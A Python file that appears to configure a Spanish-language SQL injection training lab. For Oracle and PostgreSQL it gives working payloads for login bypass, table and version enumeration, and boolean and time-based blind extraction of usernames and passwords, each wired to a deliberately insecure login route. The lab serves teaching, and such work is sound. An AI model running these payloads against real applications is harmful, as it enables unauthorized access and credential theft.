from setupOracle import *
from setupOracle import login_inseguro_blind_no_cookie_oracle
from setupPostgreSQL import *

# Diccionario de inyecciones SQL
sql_injections = {
    "database_error": {
        "title": "Database-Errors SQL Injection",
        "description": """
            <p>La inyección SQL basada en errores es una técnica de ataque en la que un atacante manipula consultas SQL para provocar que la base de datos genere mensajes de error detallados. Estos mensajes pueden revelar información sensible sobre la estructura y el contenido de la base de datos, facilitando al atacante la planificación de ataques más sofisticados. Para mitigar este riesgo, es esencial validar y sanear todas las entradas de usuario, utilizar consultas parametrizadas y configurar la aplicación para que no revele detalles internos en mensajes de error.</p>
        """,
        "dificultad": 1,
        "impacto": 2,
        "credenciales":[
            {
                # Login sin credenciales válidas
                "nombre":"Login sin credenciales válidas",
                "usuario":"cualquier_input",
                "password":"cualquier_input' OR 1=1 --"
            },
            {
                # Obtener informacion sobre la existencia de tablas en la BD
                "nombre":"Informacion sobre las tablas",
                "usuario":"' OR 1=(SELECT * FROM tabla_inexistente) --",
                "password":"cualquier_input"
            },
            {
                # Obtener informacion sobre columnas en una tabla existente
                "nombre":"Informacion sobre las columnas de una tabla",
                "usuario":"' OR 1=(SELECT columna_inexistente FROM Usuarios) --",
                "password":"cualquier_input"
            },
            {
                # Obtener informacion sobre el SGBD al probar si la funcion version() es valida en el SGBD en el que se esta trabajando (funciona en PostgreSQL y MySQL)
                "nombre":"Informacion sobre el SGBD",
                "usuario":"' OR version() = 'PostgreSQL' --",
                "password":"cualquier_input"
            }
        ],
        "route_oracle": "login_oracle_database_error",
        "route_postgres": "login_postgres_database_error",
        "function_oracle": login_inseguro_errors_oracle,
        "function_postgres": login_inseguro_errors_postgresql
    },
    #"server_error": {
    #    "title": "Server-Errors SQL Injection",
    #    "description": """
    #        <p>Utiliza los mensajes de error devueltos por el servidor para obtener información sobre la base de datos
    #        y realizar inyecciones de manera eficaz.</p>
    #    """,
    #    "credenciales":[],
    #    "usuario": "admin",
    #    "clave": "admin",
    #    "route_oracle": "login_oracle_server_error",
    #    "route_postgres": "login_postgres_server_error",
    #    "function_oracle": login_inseguro_errors_oracle,
    #    "function_postgres": login_inseguro_errors_postgresql
    #},
    "union": {
        "title": "UNION-Attack SQL Injection",
        "description": """
            <p>La inyección SQL basada en UNION es una técnica en la que un atacante utiliza la cláusula UNION para combinar los resultados de una consulta legítima con datos maliciosamente solicitados, permitiendo extraer información sensible de la base de datos. Para llevar a cabo este ataque, el atacante identifica puntos vulnerables en la aplicación web, determina el número de columnas en la consulta original y luego inyecta una consulta maliciosa que utiliza UNION SELECT para unir los resultados deseados. Para prevenir este tipo de ataques, es esencial validar y sanear todas las entradas de usuario, utilizar consultas parametrizadas y aplicar el principio de privilegios mínimos en las cuentas de la base de datos.</p>
        """,
        "dificultad": 2,
        "impacto": 3,
        "credenciales":[
            {
                "nombre":"Login sin credenciales válidas",
                "usuario":"cualquier_input",
                "password":"cualquier_input' OR 1=1 --"
            },
            {
                "nombre":"Nombre de la BD (Oracle)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT 1, ora_database_name, NULL AS nombre_bd_relleno_1, NULL AS nombre_bd_relleno_2 FROM dual --"
            },
            {
                "nombre":"Versión de la BD (Oracle)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT NULL, banner, NULL, NULL FROM v$version WHERE banner LIKE 'Oracle%' --"
            },
            {
                "nombre":"Nombre de la BD (PostgreSQL)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT NULL, current_database() AS nombre_bd, NULL, NULL; --"
            },
            {
                "nombre":"Versión de la BD (PostgreSQL)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT NULL, version(), NULL, NULL; --"
            },
            {
                "nombre":"Todas las tablas en la BD (Oracle)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT 1, NULL, OWNER, TABLE_NAME FROM all_tables WHERE OWNER='SYSTEM' -- AND password = 'cualquier_input'"
            },
            {
                "nombre":"Todas las tablas en la BD (PostgreSQL)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables WHERE table_schema = 'public'; --"
            },
            {
                "nombre":"Todas las tablas en la BD (Oracle Filtrado)",
                "usuario":"cualquier_input",
                "password":"cualquier_input' UNION SELECT 1, NULL, OWNER, TABLE_NAME FROM all_tables WHERE owner = 'SYSTEM' AND TABLE_NAME NOT LIKE '%$%' AND TABLE_NAME NOT LIKE 'SYS%' AND TABLE_NAME NOT LIKE 'LOGMNR%' --"
            }
        ],
        "route_oracle": "login_oracle_union",
        "route_postgres": "login_postgres_union",
        "function_oracle": login_inseguro_base_oracle,
        "function_postgres": login_inseguro_base_postgresql
    },
    "boolean": {
        "title": "Boolean-Based SQL Injection",
        "description": """
            <p>La inyección SQL basada en booleanos es una técnica utilizada por atacantes para manipular consultas SQL mediante la inserción de condiciones booleanas en las entradas de una aplicación web. La aplicación proporciona mensajes de error. El atacante aprovecha esta retroalimentación para extraer información de la base de datos, observando cómo las respuestas de la aplicación varían al introducir diferentes condiciones booleanas en las consultas.</p>
        """,
        "dificultad": 2,
        "impacto": 3,
        "credenciales":[
            {
                "nombre":"Provocando un error 'división por cero' para sacar la longitud de un campo (Oracle)",
                "usuario":"' OR (SELECT CASE WHEN (LENGTH(username) = 5) THEN 1/0 ELSE 1 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --",
                "password":"cualquier_input"
            },
            {
                "nombre":"Provocando un error 'división por cero' para sacar un carácter de un campo (Oracle)",
                "usuario":"' OR (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'a') THEN 1/0 ELSE 1 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --",
                "password":"cualquier_input"
            },
            {
                "nombre":"PostgreSQL no permite esto", #PostgreSQL no permite aplicar la técnica para forzar un error 'división por cero' ya que toda la consulta es analizada y evaluada en su totalidad antes de devolver un resultado, lo que provoca el error aun sin cumplir la condición
                "usuario":"' OR (SELECT CASE WHEN (LENGTH(username) = 33) THEN 1/0 ELSE 1 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --",
                "password":"cualquier_input"
            }
        ],
        "usuario": "admin",
        "clave": "admin",
        "route_oracle": "login_oracle_boolean",
        "route_postgres": "login_postgres_boolean",
        "function_oracle": login_inseguro_base_oracle,
        "function_postgres": login_inseguro_base_postgresql
    },
    "blind_boolean": {
        "title": "Blind Boolean-Based SQL Injection",
        "is_blind": True,
        "description": """
            <p>Es una técnica empleada por atacantes para extraer información de una base de datos cuando la aplicación no muestra directamente los resultados de las consultas SQL ni proporciona mensajes de error detallados. En este escenario, el atacante infiere la información observando las diferencias en las respuestas de la aplicación al enviar consultas que evalúan condiciones booleanas.</p>
        """,
        "dificultad": 3,
        "impacto": 3,
        "credenciales":[ # usuario/password en este caso serían payload que devuelva True y False respectivamente
            {
                "nombre":"Entendiendo la inyección",
                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND '1'='1",
                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND '1'='2"
            },
            {
                "nombre":"Sacando la longitud de un campo (Oracle)",
                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 5) THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --",
                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 33) THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --"
            },
            {
                "nombre":"Sacando la longitud de un campo (PostgreSQL)",
                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 5) THEN 1 ELSE 999 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --",
                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 33) THEN 1 ELSE 999 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --"
            },
            {
                "nombre":"Sacando un carácter de un campo (Oracle)",
                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'a') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --",
                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'z') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --"
            },
            {
                "nombre":"Sacando un carácter de un campo (PostgreSQL)",
                "usuario":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTRING(username FROM 1 FOR 1) = 'a') THEN 1 ELSE 999 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --",
                "password":"d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTRING(username FROM 1 FOR 1) = 'z') THEN 1 ELSE 999 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --"
            }
        ],
        "usuario": "admin",
        "clave": "admin",
        "route_oracle": "login_oracle_blind_boolean",
        "route_postgres": "login_postgres_blind_boolean",
        "function_oracle": login_inseguro_blind_no_cookie_oracle,
        "function_postgres": login_inseguro_blind_no_cookie_postgresql
    },
    "time_based": {
        "title": "Time-Based Blind SQL Injection",
        "is_blind": True,
        "description": """
            <p>Es una técnica utilizada por atacantes para extraer información de una base de datos cuando la aplicación no muestra directamente los resultados de las consultas SQL ni proporciona mensajes de error detallados. En este escenario, el atacante infiere información observando los retrasos en las respuestas de la aplicación al enviar consultas que provocan demoras condicionales en la base de datos.</p>
        """,
        "dificultad": 3,
        "impacto": 3,
        "credenciales":[{
            "nombre": "Obtener nombres de usuarios (POSTGRESQL)",
            "usuario": "' AND ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), 1) <> 'a' OR ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), 1) = 'a' AND ( SELECT NULL FROM pg_sleep(2) ) IS NULL ) ) --",
            "password": "cualquier_input"
        },
            {
                "nombre": "Obtener nombres de la base de datos (POSTGRESQL)",
                "usuario": """  '
  AND (
    left(current_database(), 1) <> 'E' 
    OR (
      left(current_database(), 1) = 'E' 
      AND EXISTS (SELECT 1 FROM pg_sleep(1))
    )
  )
--
""",
                "password": "cualquier_input"
            },
            {
                "nombre": "Usuarios y contraseñas concatenados (POSTGRESQL)",
                "usuario": """ ' AND (
    LEFT((SELECT string_agg(username || ':' || password, ',') FROM Usuarios), 1) <> 'a'
    OR (
      LEFT((SELECT string_agg(username || ':' || password, ',') FROM Usuarios), 1) = 'a'
      AND EXISTS (SELECT 1 FROM pg_sleep(1))
    )
    )
    --""",
                "password": "cualquier_input"
            },
            {
                "nombre": "Obtener nombre de la base de datos (ORACLE)",
                "usuario":"""' OR (CASE 
        WHEN SUBSTR((SELECT global_name FROM global_name), 1, 1) = 'O' 
        THEN (SELECT COUNT(*) 
              FROM all_objects, all_objects, all_objects) 
        ELSE 0 
     END) = 0 --""",
                "password": "cualquier_input"
            }
        ],
        "usuario": "admin",
        "clave": "admin",
        "route_oracle": "login_oracle_time_based",
        "route_postgres": "login_postgres_time_based",
        "function_oracle": login_inseguro_blind_no_cookie_oracle,
        "function_postgres":  login_inseguro_blind_no_cookie_postgresql
    }
}